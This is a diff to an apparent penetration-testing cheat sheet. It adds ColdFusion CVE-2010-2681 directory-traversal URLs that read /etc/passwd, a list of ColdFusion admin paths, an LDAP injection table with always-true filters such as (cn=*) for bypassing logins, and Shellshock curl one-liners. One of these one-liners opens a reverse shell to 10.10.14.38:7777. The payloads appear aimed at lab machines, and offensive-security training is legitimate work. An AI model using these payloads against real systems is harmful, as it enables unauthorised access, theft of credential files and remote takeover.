@@ -906,7 +906,22 @@ webmail.nsf;/About will give you aprox version
 names.nsf
 
 ```
+### ColdFusion 
+```
+CVE-2010-2681 - Directory Traversal 
+- POC - 
+http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en - Replace en with path
 
+http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
+
+Interesting locations:  
+
+CFIDE/administrator/settings/mappings.cfm
+logging/settings.cfm
+datasources/index.cfm
+j2eepackaging/editarchive.cfm
+CFIDE/administrator/enter.cfm
+```
 
 ### SonicWall Firewall 
 ```
@@ -1361,6 +1376,14 @@ ldapsearch -x -H ldap://10.10.10.161 -D '' -w '' -b "DC=htb,DC=local" | grep 'us
 ldapsearch -h <IP> -x -s base
 ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
 ```
+### Injection 
+| Input | Description |
+| --- | --- |
+| `*` | An asterisk `*` can `match any number of characters`. |
+| `( )` | Parentheses `( )` can `group expressions`. |
+| `\|` | A vertical bar `\|` can perform `logical OR`. |
+| `&` | An ampersand `&` can perform `logical AND`. |
+| `(cn=*)` | Input values that try to bypass authentication or authorisation checks by injecting conditions that `always evaluate to true` can be used. For example, `(cn=*)` or `(objectClass=*)` can be used as input values for a username or password fields. |
 
 ### Graphical Interface
 
@@ -3320,6 +3343,8 @@ stty rows 50 columns 235
 
 ```
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' URL/cgi-bin/access.cgi
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi | Get reverse shell to 7777
 ```
 
 ## Pivot , Tunneling and Port Forwarding
